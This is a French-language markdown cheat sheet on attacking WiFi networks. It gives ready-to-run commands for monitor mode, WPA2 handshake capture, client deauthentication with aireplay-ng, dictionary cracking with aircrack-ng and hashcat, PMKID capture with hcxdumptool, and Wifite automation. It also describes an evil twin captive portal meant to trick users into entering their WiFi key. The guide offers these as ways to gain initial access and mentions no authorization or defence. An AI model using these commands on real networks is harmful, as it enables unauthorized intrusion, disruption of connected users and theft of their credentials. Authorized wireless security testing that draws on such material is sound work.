---
tags:
  - hacking
  - wifi
  - wpa2
  - aircrack-ng
  - hashcat
---

# WiFi Hacking

Attaquer les réseaux sans fil pour obtenir un accès initial.

![WiFi Attack Sequence](../assets/infographics/security/wifi-attack-sequence.jpeg)

## 1. Prérequis Matériel

Pour attaquer le WiFi, il faut une carte réseau capable de passer en **Mode Monitor** (écouter tout le trafic) et de faire de l'**Injection de Paquets** (pour déconnecter les clients).

**Chipsets recommandés :**
*   Atheros AR9271 (Alfa AWUS036NHA)
*   Ralink RT3070 (Alfa AWUS036NH)
*   Realtek RTL8812AU (Pour le 5GHz/AC)

**Commandes de base :**
```bash
# Lister les interfaces
iwconfig

# Passer en mode Monitor (tuer les processus gênants avant)
airmon-ng check kill
airmon-ng start wlan0
```

## 2. WPA/WPA2 Handshake (La Méthode Classique)

Le but est de capturer les 4 paquets d'authentification (Handshake) échangés lorsqu'un client se connecte au WiFi.

### Étape 1 : Scanner (Airodump-ng)
Repérer le BSSID (MAC du routeur) et le canal.
```bash
airodump-ng wlan0mon
```

### Étape 2 : Ecouter la Cible
On se focalise sur le réseau cible pour capturer le handshake.
```bash
airodump-ng -c [CANAL] --bssid [MAC_ROUTEUR] -w capture wlan0mon
```

### Étape 3 : Deauth (Forcer la reconnexion)
Si personne ne se connecte, on déconnecte un client existant pour forcer son PC à se reconnecter (et donc capturer le handshake).
```bash
aireplay-ng -0 10 -a [MAC_ROUTEUR] -c [MAC_CLIENT] wlan0mon
```
*Surveillez le terminal Airodump, dès que vous voyez "WPA Handshake: ...", c'est gagné !*

### Étape 4 : Cracking (Bruteforce)
On attaque le fichier `.cap` avec un dictionnaire (rockyou.txt).

**Avec Aircrack-ng (CPU) :**
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [MAC_ROUTEUR] capture.cap
```

**Avec Hashcat (GPU - Beaucoup plus rapide) :**
Il faut d'abord convertir le `.cap` en `.hccapx` (via `cap2hccapx` ou site web).
```bash
# Mode 2500 = WPA/WPA2
hashcat -m 2500 capture.hccapx rockyou.txt
```

## 3. PMKID Attack (Sans Client)

Nouvelle méthode (depuis 2018) pour WPA2. Permet de récupérer le hash directement depuis le routeur, **sans avoir besoin qu'un client soit connecté**.

**Outil : hcxdumptool**
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```
Ensuite, cracker avec Hashcat (mode 16800).

## 4. Wifite (L'Automatisation)

Pour les paresseux, **Wifite** automatise tout le processus (scan, deauth, handshake, crack).

```bash
wifite --kill
```

## 5. Rogue AP (Evil Twin)

Créer un faux point d'accès avec le même nom (SSID) que la cible pour tromper les utilisateurs et voler leurs identifiants.

**Outil : Fluxion ou Airgeddon**
Ces scripts créent un faux portail captif ("Mise à jour du firmware, veuillez entrer votre clé WiFi").
